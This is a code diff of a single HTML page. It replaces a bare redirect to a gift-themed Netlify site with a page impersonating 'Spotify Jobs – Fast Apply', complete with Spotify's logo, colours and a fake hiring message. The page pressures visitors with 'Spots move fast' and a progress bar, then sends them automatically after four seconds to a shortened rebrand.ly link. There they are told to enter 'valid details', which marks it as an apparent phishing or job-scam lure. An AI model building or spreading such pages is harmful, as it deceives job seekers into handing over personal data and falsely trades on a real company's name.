@@ -1,14 +1,104 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Redirecting...</title>
-  <meta http-equiv="refresh" content="0; url=https://cinemasistgift.netlify.app/">
-  <script>
-    // Double assurance redirect
-    window.location.replace("https://cinemasistgift.netlify.app/");
-  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Spotify Jobs – Fast Apply</title>
+  <style>
+    :root {
+      --spotify-green: #1DB954;
+      --dark-bg: #191414;
+      --light-text: #FFFFFF;
+      --font-sans: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background-color: var(--dark-bg);
+      color: var(--light-text);
+      font-family: var(--font-sans);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      max-width: 480px;
+      width: 100%;
+    }
+    img.logo {
+      width: 80px;
+      margin: 0 auto 20px;
+    }
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 16px;
+    }
+    p.subtext {
+      font-size: 1rem;
+      margin-bottom: 32px;
+      line-height: 1.4;
+    }
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background: #333;
+      margin-bottom: 32px;
+      overflow: hidden;
+      border-radius: 4px;
+    }
+    .progress-bar-inner {
+      width: 0%;
+      height: 100%;
+      background: var(--spotify-green);
+      animation: fillBar 4s linear forwards;
+    }
+    @keyframes fillBar {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+    a.button {
+      display: inline-block;
+      background-color: var(--spotify-green);
+      color: var(--dark-bg);
+      font-size: 1.05rem;
+      text-decoration: none;
+      padding: 14px 28px;
+      border-radius: 28px;
+      transition: background 0.3s;
+    }
+    a.button:hover {
+      background-color: #1eca5f;
+    }
+    p.note {
+      font-size: 0.85rem;
+      opacity: 0.75;
+      margin-top: 16px;
+    }
+  </style>
 </head>
-<body></body>
+<body>
+
+  <div class="container">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" alt="Spotify Logo">
+    <h1>Spotify is hiring people who love music 🎧</h1>
+    <p class="subtext">You’ll answer a few quick questions and fill out your details to apply. Jobs are available based on your region. Spots move fast.</p>
+
+    <div class="progress-bar">
+      <div class="progress-bar-inner"></div>
+    </div>
+
+    <a href="https://rebrand.ly/newjobslooker-e66677" class="button">Continue to Spotify Jobs →</a>
+
+    <p class="note">Make sure to fill out the form with valid details so your application counts.</p>
+  </div>
+
+  <script>
+    setTimeout(function(){
+      window.location.href = "https://rebrand.ly/newjobslooker-e66677";
+    }, 4000);
+  </script>
+
+</body>
 </html>
